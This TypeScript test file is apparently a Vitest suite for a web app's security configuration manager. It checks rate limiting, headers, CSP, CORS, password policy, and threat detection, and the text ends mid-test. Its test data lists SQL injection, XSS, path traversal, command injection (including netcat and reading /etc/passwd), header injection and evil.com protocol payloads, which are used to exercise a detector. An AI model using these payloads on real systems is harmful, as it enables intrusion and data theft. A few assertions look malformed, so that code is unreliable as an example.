/**
 * Comprehensive Security Testing Suite
 * Tests for rate limiting, security headers, input sanitization, SQL injection prevention,
 * XSS protection, CORS configuration, and security vulnerability detection
 */

import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import express, { Request, Response, NextFunction } from 'express';
import request from 'supertest';
import {
  SecurityConfigManager,
  SecurityConfig,
  SecurityConfigUtils,
  SecurityEventType,
  defaultSecurityConfigManager,
  type SecurityEvent,
  type ThreatDetectionResult,
  type BestPracticesReport,
  type ValidationResult,
  type SanitizationRule
} from '../server/security.config';

// Mock Express and related dependencies
vi.mock('express', () => ({
  default: vi.fn().mockImplementation(() => ({
    use: vi.fn(),
    get: vi.fn(),
    post: vi.fn(),
    put: vi.fn(),
    delete: vi.fn(),
    listen: vi.fn(),
    set: vi.fn()
  }))
}));

vi.mock('supertest', () => ({
  default: vi.fn().mockReturnValue({
    get: vi.fn().mockReturnThis(),
    post: vi.fn().mockReturnThis(),
    put: vi.fn().mockReturnThis(),
    delete: vi.fn().mockReturnThis(),
    send: vi.fn().mockReturnThis(),
    set: vi.fn().mockReturnThis(),
    expect: vi.fn().mockImplementation((status) => {
      return {
        then: (callback: any) => callback({ status }),
        catch: vi.fn()
      };
    })
  })
}));

// Test Data Constants
const MALICIOUS_INPUTS = {
  sqlInjection: [
    "'; DROP TABLE users; --",
    "' OR '1'='1",
    "admin'--",
    "'; INSERT INTO users (admin, password) VALUES ('hacker', 'password'); --",
    "1 UNION SELECT * FROM users",
    "'; UPDATE users SET password='hacked' WHERE username='admin'; --"
  ],
  xssPayloads: [
    "<script>alert('xss')</script>",
    "<img src=x onerror=alert('xss')>",
    "javascript:alert('xss')",
    "<svg onload=alert('xss')>",
    "';alert('xss');//",
    "<iframe src=javascript:alert('xss')>",
    "<body onload=alert('xss')>",
    "<input onfocus=alert('xss') autofocus>",
    "<select onfocus=alert('xss') autofocus>",
    "<textarea onfocus=alert('xss') autofocus>",
    "<keygen onfocus=alert('xss') autofocus>",
    "<video><source onerror=alert('xss')>",
    "<audio src=x onerror=alert('xss')>",
    "<details open ontoggle=alert('xss')>",
    "<marquee onstart=alert('xss')>",
    "<meter onfocus=alert('xss') autofocus>"
  ],
  pathTraversal: [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "....//....//....//etc//passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    ".../.../.../etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
  ],
  commandInjection: [
    "; cat /etc/passwd",
    "| whoami",
    "&& ls -la",
    "`id`",
    "$(cat /etc/passwd)",
    "; nc -l 4444",
    "| ping -c 1 127.0.0.1"
  ],
  headerInjection: [
    "test%0d%0aSet-Cookie: admin=true",
    "test\r\nSet-Cookie: admin=true",
    "test%0aSet-Cookie: admin=true",
    "test\nSet-Cookie: admin=true",
    "test%0dSet-Cookie: admin=true",
    "test\rSet-Cookie: admin=true"
  ],
  protocolInjection: [
    "file:///etc/passwd",
    "ftp://admin:password@evil.com",
    "gopher://127.0.0.1:25/_HELO",
    "dict://127.0.0.1:11211/",
    "sftp://evil.com",
    "ldap://127.0.0.1:389/cn=test"
  ]
};

const SECURITY_HEADERS = {
  'Strict-Transport-Security': 'max-age=31536000; includeSubDomains; preload',
  'X-Content-Type-Options': 'nosniff',
  'X-Frame-Options': 'DENY',
  'X-XSS-Protection': '1; mode=block',
  'Referrer-Policy': 'strict-origin-when-cross-origin',
  'Content-Security-Policy': expect.any(String),
  'X-Download-Options': 'noopen',
  'X-Permitted-Cross-Domain-Policies': 'none'
};

describe('Security Testing Suite', () => {
  let securityConfigManager: SecurityConfigManager;
  let mockApp: any;
  let mockRequest: Partial<Request>;
  let mockResponse: Partial<Response>;
  let mockNext: NextFunction;

  beforeEach(() => {
    vi.clearAllMocks();
    securityConfigManager = new SecurityConfigManager();
    mockNext = vi.fn();

    // Create mock Express app
    mockApp = {
      use: vi.fn(),
      get: vi.fn(),
      post: vi.fn(),
      put: vi.fn(),
      delete: vi.fn(),
      listen: vi.fn(),
      set: vi.fn()
    };

    // Mock Express function to return our mock app
    const { default: express } = vi.importMock('express');
    express.mockReturnValue(mockApp);

    // Mock request/response objects
    mockRequest = {
      method: 'GET',
      path: '/test',
      headers: {},
      query: {},
      body: {},
      ip: '127.0.0.1',
      get: vi.fn((header: string) => mockRequest.headers![header]),
      user: undefined
    };

    mockResponse = {
      statusCode: 200,
      headers: {},
      set: vi.fn(),
      get: vi.fn((header: string) => mockResponse.headers![header]),
      json: vi.fn(),
      send: vi.fn(),
      status: vi.fn().mockReturnThis()
    };
  });

  afterEach(() => {
    securityConfigManager.cleanup();
  });

  describe('Security Configuration Validation', () => {
    it('should validate complete security configuration', () => {
      const config = securityConfigManager.getConfig();
      expect(config).toBeDefined();
      expect(config.authentication).toBeDefined();
      expect(config.authorization).toBeDefined();
      expect(config.encryption).toBeDefined();
      expect(config.policies).toBeDefined();
      expect(config.rateLimiting).toBeDefined();
      expect(config.headers).toBeDefined();
    });

    it('should validate authentication configuration', () => {
      const config = securityConfigManager.getConfig();
      const { authentication } = config;

      expect(authentication.sessionTimeout).toBeGreaterThan(0);
      expect(authentication.maxLoginAttempts).toBeGreaterThan(0);
      expect(authentication.lockoutDuration).toBeGreaterThan(0);
      expect(authentication.passwordPolicy).toBeDefined();
      expect(authentication.jwtConfig).toBeDefined();

      // Validate password policy
      expect(authentication.passwordPolicy.minLength).toBeGreaterThanOrEqual(8);
      expect(authentication.passwordPolicy.requireUppercase).toBe(true);
      expect(authentication.passwordPolicy.requireLowercase).toBe(true);
      expect(authentication.passwordPolicy.requireNumbers).toBe(true);
    });

    it('should validate encryption configuration', () => {
      const config = securityConfigManager.getConfig();
      const { encryption } = config;

      expect(['aes-256-gcm', 'aes-256-cbc']).toContain(encryption.algorithm);
      expect(encryption.keyLength).toBeGreaterThanOrEqual(128);
      expect(encryption.saltRounds).toBeGreaterThanOrEqual(10);
      expect(encryption.enableAtRestEncryption).toBe(true);
      expect(encryption.enableTransitEncryption).toBe(true);
    });

    it('should validate rate limiting configuration', () => {
      const config = securityConfigManager.getConfig();
      const { rateLimiting } = config;

      expect(rateLimiting.windowMs).toBeGreaterThan(0);
      expect(rateLimiting.maxRequests).toBeGreaterThan(0);
      expect(rateLimiting.customLimiters).toBeDefined();
      expect(rateLimiting.customLimiters.login).toBeDefined();
      expect(rateLimiting.customLimiters.api).toBeDefined();
    });

    it('should validate security headers configuration', () => {
      const config = securityConfigManager.getConfig();
      const { headers } = config;

      expect(headers.enabled).toBe(true);
      expect(headers.strictTransportSecurity).toBe(true);
      expect(headers.contentTypeOptions).toBe(true);
      expect(headers.frameOptions).toBeDefined();
      expect(headers.xssProtection).toBe(true);
      expect(headers.referrerPolicy).toBeDefined();
    });

    it('should update configuration correctly', () => {
      const updates = {
        authentication: {
          sessionTimeout: 60,
          maxLoginAttempts: 3,
          lockoutDuration: 30,
          requireMFA: true,
          passwordPolicy: {
            minLength: 16,
            maxLength: 128,
            requireUppercase: true,
            requireLowercase: true,
            requireNumbers: true,
            requireSpecialChars: true,
            preventCommonPasswords: true,
            preventReuse: 10,
            expiryDays: 60
          },
          jwtConfig: {
            secret: 'new-secret',
            algorithm: 'HS256',
            expiresIn: '10m',
            refreshTokenExpiry: '5d',
            issuer: 'test-app',
            audience: 'test-users'
          }
        }
      };

      securityConfigManager.updateConfig(updates);
      const updatedConfig = securityConfigManager.getConfig();

      expect(updatedConfig.authentication.sessionTimeout).toBe(60);
      expect(updatedConfig.authentication.maxLoginAttempts).toBe(3);
    });
  });

  describe('Rate Limiting', () => {
    it('should allow requests within rate limit', () => {
      const result = securityConfigManager.checkRateLimit('user123', 'api');
      expect(result.allowed).toBe(true);
      expect(result.remaining).toBeGreaterThan(0);
    });

    it('should block requests that exceed rate limit', () => {
      // Mock exceeding rate limit
      vi.spyOn(securityConfigManager as any, 'getRateLimitCount').mockReturnValue(1000);
      
      const result = securityConfigManager.checkRateLimit('user123', 'api');
      expect(result.allowed).toBe(false);
      expect(result.remaining).toBe(0);
      expect(result.resetTime).toBeDefined();
    });

    it('should create security event when rate limit exceeded', () => {
      const eventSpy = vi.spyOn(securityConfigManager, 'createSecurityEvent' as any);
      vi.spyOn(securityConfigManager as any, 'getRateLimitCount').mockReturnValue(1000);

      securityConfigManager.checkRateLimit('user123', 'api');
      
      expect(eventSpy).toHaveBeenCalledWith({
        type: SecurityEventType.RATE_LIMIT_EXCEEDED,
        severity: 'medium',
        source: 'rate-limiter',
        description: expect.stringContaining('Rate limit exceeded'),
        metadata: expect.objectContaining({
          key: 'user123',
          type: 'api'
        })
      });
    });

    it('should handle different rate limiter types', () => {
      const loginResult = securityConfigManager.checkRateLimit('user123', 'login');
      const apiResult = securityConfigManager.checkRateLimit('user123', 'api');
      const defaultResult = securityConfigManager.checkRateLimit('user123');

      expect(loginResult).toBeDefined();
      expect(apiResult).toBeDefined();
      expect(defaultResult).toBeDefined();
    });

    it('should respect custom rate limit configurations', () => {
      const config = securityConfigManager.getConfig();
      expect(config.rateLimiting.customLimiters.login.max).toBe(5);
      expect(config.rateLimiting.customLimiters.api.max).toBe(1000);
    });

    it('should handle disabled rate limiting', () => {
      securityConfigManager.updateConfig({
        rateLimiting: { enabled: false } as any
      });

      const result = securityConfigManager.checkRateLimit('user123', 'api');
      expect(result.allowed).toBe(true);
      expect(result.remaining).toBe(Infinity);
    });
  });

  describe('Security Headers Validation', () => {
    it('should generate all required security headers', () => {
      const headers = securityConfigManager.getSecurityHeaders();
      
      expect(headers['Strict-Transport-Security']).toBeDefined();
      expect(headers['X-Content-Type-Options']).toBe('nosniff');
      expect(headers['X-Frame-Options']).toBe('DENY');
      expect(headers['X-XSS-Protection']).toBe('1; mode=block');
      expect(headers['Referrer-Policy']).toBe('strict-origin-when-cross-origin');
      expect(headers['Content-Security-Policy']).toBeDefined();
    });

    it('should generate correct Content Security Policy', () => {
      const headers = securityConfigManager.getSecurityHeaders();
      const csp = headers['Content-Security-Policy'];
      
      expect(csp).toContain('default-src');
      expect(csp).toContain('script-src');
      expect(csp).toContain('style-src');
      expect(csp).toContain('img-src');
      expect(csp).toContain('object-src \'none\'');
      expect(csp).toContain('frame-src \'none\'');
    });

    it('should include HSTS with correct parameters', () => {
      const headers = securityConfigManager.getSecurityHeaders();
      const hsts = headers['Strict-Transport-Security'];
      
      expect(hsts).toContain('max-age=31536000');
      expect(hsts).toContain('includeSubDomains');
      expect(hsts).toContain('preload');
    });

    it('should disable security headers when disabled', () => {
      securityConfigManager.updateConfig({
        headers: { enabled: false } as any
      });

      const headers = securityConfigManager.getSecurityHeaders();
      expect(Object.keys(headers)).toHaveLength(0);
    });

    it('should handle partial header configuration', () => {
      securityConfigManager.updateConfig({
        headers: {
          enabled: true,
          strictTransportSecurity: false,
          contentTypeOptions: true,
          frameOptions: 'SAMEORIGIN',
          xssProtection: false,
          referrerPolicy: 'no-referrer'
        } as any
      });

      const headers = securityConfigManager.getSecurityHeaders();
      expect(headers['Strict-Transport-Security']).toBeUndefined();
      expect(headers['X-Content-Type-Options']).toBe('nosniff');
      expect(headers['X-Frame-Options']).toBe('SAMEORIGIN');
      expect(headers['X-XSS-Protection']).toBeUndefined();
      expect(headers['Referrer-Policy']).toBe('no-referrer');
    });
  });

  describe('Input Sanitization', () => {
    it('should sanitize input according to rules', () => {
      const rules: SanitizationRule[] = [
        { field: 'email', type: 'email', stripHtml: true, trimWhitespace: true, escapeHtml: true },
        { field: 'message', type: 'string', stripHtml: true, trimWhitespace: true, escapeHtml: true }
      ];

      const dirtyInput = '  <script>alert("xss")</script>test@example.com  ';
      const sanitized = SecurityConfigUtils.sanitizeInput(dirtyInput, rules);

      expect(sanitized).not.toContain('<script>');
      expect(sanitized).not.toContain('</script>');
      expect(sanitized).not.toContain('alert');
      expect(sanitized).toContain('test@example.com');
    });

    it('should remove HTML tags when stripHtml is true', () => {
      const rules: SanitizationRule[] = [
        { field: 'text', type: 'string', stripHtml: true, trimWhitespace: false, escapeHtml: false }
      ];

      const input = '<div><p>Hello <strong>World</strong></p></div>';
      const sanitized = SecurityConfigUtils.sanitizeInput(input, rules);
      
      expect(sanitized).toBe('Hello World');
      expect(sanitized).not.toContain('<');
      expect(sanitized).not.toContain('>');
    });

    it('should escape HTML when escapeHtml is true', () => {
      const rules: SanitizationRule[] = [
        { field: 'text', type: 'string', stripHtml: false, trimWhitespace: false, escapeHtml: true }
      ];

      const input = '<script>alert("xss")</script>';
      const sanitized = SecurityConfigUtils.sanitizeInput(input, rules);
      
      expect(sanitized).toContain('&lt;');
      expect(sanitized).toContain('&gt;');
      expect(sanitized).toContain('&amp;');
      expect(sanitized).not.toContain('<script>');
      expect(sanitized).not.toContain('</script>');
    });

    it('should trim whitespace when trimWhitespace is true', () => {
      const rules: SanitizationRule[] = [
        { field: 'text', type: 'string', stripHtml: false, trimWhitespace: true, escapeHtml: false }
      ];

      const input = '   test input   ';
      const sanitized = SecurityConfigUtils.sanitizeInput(input, rules);
      
      expect(sanitized).toBe('test input');
    });

    it('should apply multiple sanitization rules', () => {
      const rules: SanitizationRule[] = [
        { field: 'email', type: 'email', stripHtml: true, trimWhitespace: true, escapeHtml: true }
      ];

      const input = '  <div><script>alert("xss")</script></div>test@example.com  ';
      const sanitized = SecurityConfigUtils.sanitizeInput(input, rules);
      
      expect(sanitized).toBe('&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;test@example.com');
    });

    it('should handle empty input', () => {
      const rules: SanitizationRule[] = [
        { field: 'text', type: 'string', stripHtml: true, trimWhitespace: true, escapeHtml: true }
      ];

      const sanitized = SecurityConfigUtils.sanitizeInput('', rules);
      expect(sanitized).toBe('');
    });

    it('should handle undefined input gracefully', () => {
      const rules: SanitizationRule[] = [
        { field: 'text', type: 'string', stripHtml: true, trimWhitespace: true, escapeHtml: true }
      ];

      expect(() => {
        SecurityConfigUtils.sanitizeInput(undefined as any, rules);
      }).not.toThrow();
    });
  });

  describe('SQL Injection Prevention', () => {
    it('should detect SQL injection patterns', () => {
      const maliciousInputs = MALICIOUS_INPUTS.sqlInjection;
      
      maliciousInputs.forEach(input => {
        const threats = securityConfigManager.analyzeThreats(input);
        const sqlThreat = threats.find(threat => 
          threat.category === 'injection' && 
          threat.patternName.toLowerCase().includes('sql')
        );
        expect(sqlThreat).toBeDefined();
        expect(sqlThreat!.severity).toBe('high');
      });
    });

    it('should handle common SQL injection variants', () => {
      const variants = [
        "admin' OR '1'='1' --",
        "admin'/*",
        "admin' OR 'a'='a",
        "') OR ('1'='1",
        "1' AND '1'='1",
        "admin' UNION SELECT 1,1,1/*",
        "1; DROP TABLE users--"
      ];

      variants.forEach(input => {
        const threats = securityConfigManager.analyzeThreats(input);
        expect(threats.length).toBeGreaterThan(0);
        
        const hasInjectionThreat = threats.some(threat => threat.category === 'injection');
        expect(hasInjectionThreat).toBe(true);
      });
    });

    it('should handle time-based SQL injection attempts', () => {
      const timeBasedPayloads = [
        "admin' AND SLEEP(5)--",
        "admin' WAITFOR DELAY '00:00:05'--",
        "admin'; WAITFOR DELAY '00:00:05'--",
        "admin' AND (SELECT COUNT(*) FROM information_schema.tables)>0 AND SLEEP(5)--"
      ];

      timeBasedPayloads.forEach(input => {
        const threats = securityConfigManager.analyzeThreats(input);
        expect(threats.length).toBeGreaterThan(0);
      });
    });

    it('should handle union-based SQL injection', () => {
      const unionPayloads = [
        "1 UNION SELECT * FROM users",
        "1 UNION SELECT username,password FROM admin_users",
        "' UNION SELECT 1,2,3--",
        "1 UNION ALL SELECT * FROM users WHERE '1'='1"
      ];

      unionPayloads.forEach(input => {
        const threats = securityConfigManager.analyzeThreats(input);
        expect(threats.length).toBeGreaterThan(0);
      });
    });

    it('should create security events for SQL injection attempts', () => {
      const eventSpy = vi.spyOn(securityConfigManager, 'createSecurityEvent' as any);
      const input = "'; DROP TABLE users; --";
      
      securityConfigManager.analyzeThreats(input);
      
      expect(eventSpy).toHaveBeenCalledWith({
        type: SecurityEventType.THREAT_DETECTED,
        severity: 'high',
        source: 'threat-detection',
        description: expect.stringContaining('SQL Injection'),
        metadata: expect.objectContaining({
          patternName: expect.stringContaining('SQL')
        })
      });
    });
  });

  describe('XSS Protection', () => {
    it('should detect XSS patterns in input', () => {
      const xssPayloads = MALICIOUS_INPUTS.xssPayloads;
      
      xssPayloads.forEach(payload => {
        const threats = securityConfigManager.analyzeThreats(payload);
        const xssThreat = threats.find(threat => threat.category === 'xss');
        expect(xssThreat).toBeDefined();
        expect(xssThreat!.severity).toBe('high');
      });
    });

    it('should detect various XSS vectors', () => {
      const xssVectors = [
        { type: 'Script tag', payload: '<script>alert(1)</script>' },
        { type: 'Image onerror', payload: '<img src=x onerror=alert(1)>' },
        { type: 'SVG onload', payload: '<svg onload=alert(1)>' },
        { type: 'Iframe javascript', payload: '<iframe src=javascript:alert(1)>' },
        { type: 'Body onload', payload: '<body onload=alert(1)>' },
        { type: 'Input onfocus', payload: '<input onfocus=alert(1) autofocus>' }
      ];

      xssVectors.forEach(({ type, payload }) => {
        const threats = securityConfigManager.analyzeThreats(payload);
        expect(threats.length).toBeGreaterThan(0).fail(`${type} was not detected`);
      });
    });

    it('should detect encoded XSS attempts', () => {
      const encodedPayloads = [
        '%3Cscript%3Ealert%281%29%3C%2Fscript%3E',
        '&lt;script&gt;alert(1)&lt;/script&gt;',
        '&#60;script&#62;alert(1)&#60;/script&#62;',
        '%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E'
      ];

      encodedPayloads.forEach(payload => {
        const threats = securityConfigManager.analyzeThreats(payload);
        expect(threats.length).toBeGreaterThan(0);
      });
    });

    it('should handle event handler XSS', () => {
      const eventHandlerPayloads = [
        '<div onclick="alert(1)">Click me</div>',
        '<input onkeypress="alert(1)">',
        '<select onchange="alert(1)">',
        '<form onsubmit="alert(1)">',
        '<table onmouseover="alert(1)">'
      ];

      eventHandlerPayloads.forEach(payload => {
        const threats = securityConfigManager.analyzeThreats(payload);
        expect(threats.length).toBeGreaterThan(0);
      });
    });

    it('should handle JavaScript protocol XSS', () => {
      const jsProtocolPayloads = [
        'javascript:alert(1)',
        'vbscript:msgbox(1)',
        'data:text/html,<script>alert(1)</script>',
        'file:///etc/passwd'
      ];

      jsProtocolPayloads.forEach(payload => {
        const threats = securityConfigManager.analyzeThreats(payload);
        expect(threats.length).toBeGreaterThan(0);
      });
    });

    it('should create security events for XSS attempts', () => {
      const eventSpy = vi.spyOn(securityConfigManager, 'createSecurityEvent' as any);
      const payload = '<script>alert("xss")</script>';
      
      securityConfigManager.analyzeThreats(payload);
      
      expect(eventSpy).toHaveBeenCalledWith({
        type: SecurityEventType.THREAT_DETECTED,
        severity: 'high',
        source: 'threat-detection',
        description: expect.stringContaining('Cross-Site Scripting'),
        metadata: expect.objectContaining({
          patternName: expect.stringContaining('XSS')
        })
      });
    });
  });

  describe('CORS Configuration', () => {
    it('should validate CORS policy configuration', () => {
      const config = securityConfigManager.getConfig();
      const { corsPolicy } = config.policies;
      
      expect(corsPolicy.origin).toBeDefined();
      expect(corsPolicy.methods).toBeDefined();
      expect(corsPolicy.headers).toBeDefined();
      expect(typeof corsPolicy.credentials).toBe('boolean');
      expect(corsPolicy.maxAge).toBeGreaterThan(0);
    });

    it('should allow specific origins only', () => {
      const config = securityConfigManager.getConfig();
      expect(config.policies.corsPolicy.origin).toContain('http://localhost:3000');
    });

    it('should restrict HTTP methods appropriately', () => {
      const config = securityConfigManager.getConfig();
      const allowedMethods = config.policies.corsPolicy.methods;
      
      expect(allowedMethods).toContain('GET');
      expect(allowedMethods).toContain('POST');
      expect(allowedMethods).toContain('PUT');
      expect(allowedMethods).toContain('DELETE');
      expect(allowedMethods).toContain('OPTIONS');
    });

    it('should restrict allowed headers', () => {
      const config = securityConfigManager.getConfig();
      const allowedHeaders = config.policies.corsPolicy.headers;
      
      expect(allowedHeaders).toContain('Content-Type');
      expect(allowedHeaders).toContain('Authorization');
      expect(allowedHeaders).toContain('X-Requested-With');
    });

    it('should configure CORS credentials properly', () => {
      const config = securityConfigManager.getConfig();
      expect(config.policies.corsPolicy.credentials).toBe(true);
    });

    it('should set appropriate CORS max age', () => {
      const config = securityConfigManager.getConfig();
      expect(config.policies.corsPolicy.maxAge).toBe(86400); // 24 hours
    });
  });

  describe('Content Security Policy', () => {
    it('should configure restrictive CSP by default', () => {
      const config = securityConfigManager.getConfig();
      const csp = config.policies.contentSecurityPolicy;
      
      expect(csp.defaultSrc).toContain("'self'");
      expect(csp.objectSrc).toContain("'none'");
      expect(csp.frameSrc).toContain("'none'");
    });

    it('should restrict script sources', () => {
      const config = securityConfigManager.getConfig();
      const csp = config.policies.contentSecurityPolicy;
      
      expect(csp.scriptSrc).toContain("'self'");
      // Should not allow 'unsafe-inline' in production, but may allow in development
    });

    it('should restrict image sources', () => {
      const config = securityConfigManager.getConfig();
      const csp = config.policies.contentSecurityPolicy;
      
      expect(csp.imgSrc).toContain("'self'");
      expect(csp.imgSrc).toContain('data:');
      expect(csp.imgSrc).toContain('https:');
    });

    it('should restrict font sources', () => {
      const config = securityConfigManager.getConfig();
      const csp = config.policies.contentSecurityPolicy;
      
      expect(csp.fontSrc).toContain("'self'");
    });

    it('should generate proper CSP header', () => {
      const headers = securityConfigManager.getSecurityHeaders();
      const csp = headers['Content-Security-Policy'];
      
      expect(csp).toContain('default-src \'self\'');
      expect(csp).toContain('object-src \'none\'');
      expect(csp).toContain('frame-src \'none\'');
    });
  });

  describe('Threat Detection and Response', () => {
    it('should detect path traversal attempts', () => {
      const pathTraversalInputs = MALICIOUS_INPUTS.pathTraversal;
      
      pathTraversalInputs.forEach(input => {
        const threats = securityConfigManager.analyzeThreats(input);
        const traversalThreat = threats.find(threat => threat.category === 'traversal');
        expect(traversalThreat).toBeDefined();
      });
    });

    it('should detect command injection attempts', () => {
      const commandInjectionInputs = MALICIOUS_INPUTS.commandInjection;
      
      commandInjectionInputs.forEach(input => {
        const threats = securityConfigManager.analyzeThreats(input);
        expect(threats.length).toBeGreaterThan(0);
      });
    });

    it('should detect header injection attempts', () => {
      const headerInjectionInputs = MALICIOUS_INPUTS.headerInjection;
      
      headerInjectionInputs.forEach(input => {
        const threats = securityConfigManager.analyzeThreats(input);
        expect(threats.length).toBeGreaterThan(0);
      });
    });

    it('should detect protocol injection attempts', () => {
      const protocolInjectionInputs = MALICIOUS_INPUTS.protocolInjection;
      
      protocolInjectionInputs.forEach(input => {
        const threats = securityConfigManager.analyzeThreats(input);
        expect(threats.length).toBeGreaterThan(0);
      });
    });

    it('should handle multiple threats in single input', () => {
      const complexPayload = "<script>alert('xss');' DROP TABLE users;--</script>";
      const threats = securityConfigManager.analyzeThreats(complexPayload);
      
      expect(threats.length).toBeGreaterThan(0);
      const threatCategories = threats.map(t => t.category);
      expect(threatCategories).toContain('xss');
    });

    it('should respond appropriately to high-severity threats', () => {
      const eventSpy = vi.spyOn(securityConfigManager, 'createSecurityEvent' as any);
      const config = securityConfigManager.getConfig();
      
      // Ensure threat detection is enabled
      expect(config.threatDetection.enabled).toBe(true);
      
      const sqlInjection = "'; DROP TABLE users; --";
      securityConfigManager.analyzeThreats(sqlInjection);
      
      // Should have created security events
      expect(eventSpy).toHaveBeenCalled();
    });
  });

  describe('Security Event Management', () => {
    it('should create security events with proper structure', () => {
      const event = securityConfigManager.createSecurityEvent({
        type: SecurityEventType.AUTHENTICATION_FAILURE,
        severity: 'medium',
        source: 'test-source',
        description: 'Test authentication failure',
        metadata: { test: true }
      });

      expect(event.id).toBeDefined();
      expect(event.timestamp).toBeDefined();
      expect(event.type).toBe(SecurityEventType.AUTHENTICATION_FAILURE);
      expect(event.severity).toBe('medium');
      expect(event.source).toBe('test-source');
      expect(event.description).toBe('Test authentication failure');
      expect(event.resolved).toBe(false);
      expect(event.metadata).toEqual({ test: true });
    });

    it('should create different types of security events', () => {
      const eventTypes = [
        SecurityEventType.AUTHENTICATION_FAILURE,
        SecurityEventType.AUTHORIZATION_FAILURE,
        SecurityEventType.THREAT_DETECTED,
        SecurityEventType.ANOMALY_DETECTED,
        SecurityEventType.RATE_LIMIT_EXCEEDED,
        SecurityEventType.SUSPICIOUS_ACTIVITY,
        SecurityEventType.SECURITY_VIOLATION,
        SecurityEventType.AUDIT_LOG_EVENT,
        SecurityEventType.COMPLIANCE_VIOLATION,
        SecurityEventType.DATA_BREACH_ATTEMPT
      ];

      eventTypes.forEach(eventType => {
        const event = securityConfigManager.createSecurityEvent({
          type: eventType,
          severity: 'low',
          source: 'test',
          description: `Test ${eventType}`,
          metadata: {}
        });

        expect(event.type).toBe(eventType);
      });
    });

    it('should handle security events queue', () => {
      const eventSpy = vi.spyOn(securityConfigManager, 'on' as any);
      
      // Add multiple events to trigger queue processing
      for (let i = 0; i < 55; i++) {
        securityConfigManager.createSecurityEvent({
          type: SecurityEventType.AUDIT_LOG_EVENT,
          severity: 'low',
          source: 'test',
          description: `Test event ${i}`,
          metadata: {}
        });
      }
      
      // Event processing should have been triggered
      expect(eventSpy).toHaveBeenCalled();
    });

    it('should emit security events', (done) => {
      securityConfigManager.on('securityEvent', (event: SecurityEvent) => {
        expect(event).toBeDefined();
        expect(event.type).toBe(SecurityEventType.AUTHENTICATION_FAILURE);
        done();
      });

      securityConfigManager.createSecurityEvent({
        type: SecurityEventType.AUTHENTICATION_FAILURE,
        severity: 'medium',
        source: 'test',
        description: 'Test event',
        metadata: {}
      });
    });
  });

  describe('Authentication Security', () => {
    it('should enforce password policy validation', () => {
      const testPasswords = [
        { password: 'weak', shouldPass: false, reason: 'too short' },
        { password: 'NoNumbers!', shouldPass: false, reason: 'no numbers' },
        { password: 'nonumberspecials123', shouldPass: false, reason: 'no special chars' },
        { password: 'NoSpecialChars123', shouldPass: false, reason: 'no special chars' },
        { password: 'ValidPassword123!', shouldPass: true, reason: 'meets all requirements' },
        { password: 'AnotherValidPass456@', shouldPass: true, reason: 'meets all requirements' }
      ];

      testPasswords.forEach(({ password, shouldPass }) => {
        const result = SecurityConfigUtils.validatePassword(password);
        expect(result.valid).toBe(shouldPass);
      });
    });

    it('should calculate password entropy correctly', () => {
      const simplePassword = 'abc';
      const complexPassword = 'MyC0mpl3x!P@ssw0rd';
      
      const simpleEntropy = SecurityConfigUtils.calculateEntropy(simplePassword);
      const complexEntropy = SecurityConfigUtils.calculateEntropy(complexPassword);
      
      expect(complexEntropy).toBeGreaterThan(simpleEntropy);
      expect(complexEntropy).toBeGreaterThan(50); // Good passwords should have high entropy
    });

    it('should hash passwords securely', async () => {
      const password = 'TestPassword123!';
      const hashed = await SecurityConfigUtils.hashPassword(password);
      
      expect(hashed).toBeDefined();
      expect(hashed).not.toBe(password);
      expect(hashed.length).toBeGreaterThan(password.length);
    });

    it('should validate session timeout configuration', () => {
      const config = securityConfigManager.getConfig();
      expect(config.authentication.sessionTimeout).toBeLessThanOrEqual(60);
      expect(config.authentication.sessionTimeout).toBeGreaterThan(0);
    });

    it('should enforce maximum login attempts', () => {
      const config = securityConfigManager.getConfig();
      expect(config.authentication.maxLoginAttempts).toBeLessThanOrEqual(10);
      expect(config.authentication.maxLoginAttempts).toBeGreaterThan(0);
    });

    it('should configure lockout duration appropriately', () => {
      const config = securityConfigManager.getConfig();
      expect(config.authentication.lockoutDuration).toBeGreaterThan(0);
      expect(config.authentication.lockoutDuration).toBeLessThanOrEqual(1440); // Max 24 hours
    });
  });

  describe('Encryption and Cryptography', () => {
    it('should use strong encryption algorithms', () => {
      const config = securityConfigManager.getConfig();
      expect(['aes-256-gcm', 'aes-256-cbc']).toContain(config.encryption.algorithm);
    });

    it('should configure appropriate key lengths', () => {
      const config = securityConfigManager.getConfig();
      expect(config.encryption.keyLength).toBeGreaterThanOrEqual(256);
    });

    it('should use sufficient salt rounds for password hashing', () => {
      const config = securityConfigManager.getConfig();
      expect(config.encryption.saltRounds).toBeGreaterThanOrEqual(12);
    });

    it('should enable encryption at rest', () => {
      const config = securityConfigManager.getConfig();
      expect(config.encryption.enableAtRestEncryption).toBe(true);
    });

    it('should enable encryption in transit', () => {
      const config = securityConfigManager.getConfig();
      expect(config.encryption.enableTransitEncryption).toBe(true);
    });

    it('should generate secure tokens', () => {
      const token1 = SecurityConfigUtils.generateSecurityToken(32);
      const token2 = SecurityConfigUtils.generateSecurityToken(32);
      
      expect(token1).toHaveLength(32);
      expect(token2).toHaveLength(32);
      expect(token1).not.toBe(token2);
      
      // Check that tokens contain only valid characters
      expect(/^[A-Za-z0-9]+$/.test(token1)).toBe(true);
      expect(/^[A-Za-z0-9]+$/.test(token2)).toBe(true);
    });

    it('should validate secure connection protocols', () => {
      expect(SecurityConfigUtils.isSecureConnection('https')).toBe(true);
      expect(SecurityConfigUtils.isSecureConnection('wss')).toBe(true);
      expect(SecurityConfigUtils.isSecureConnection('http')).toBe(false);
      expect(SecurityConfigUtils.isSecureConnection('ws')).toBe(false);
    });
  });

  describe('Best Practices Enforcement', () => {
    it('should enforce password policy best practices', () => {
      const report = securityConfigManager.enforceBestPractices();
      
      expect(report).toBeDefined();
      expect(report.score).toBeGreaterThanOrEqual(0);
      expect(report.score).toBeLessThanOrEqual(100);
      expect(report.passedChecks).toBeLessThanOrEqual(report.totalChecks);
    });

    it('should check password complexity requirements', () => {
      const report = securityConfigManager.enforceBestPractices();
      expect(report.totalChecks).toBeGreaterThan(0);
    });

    it('should check session timeout recommendations', () => {
      const report = securityConfigManager.enforceBestPractices();
      expect(report.issues).toBeDefined();
      expect(report.recommendations).toBeDefined();
    });

    it('should check MFA requirement', () => {
      const report = securityConfigManager.enforceBestPractices();
      expect(report.issues).toBeDefined();
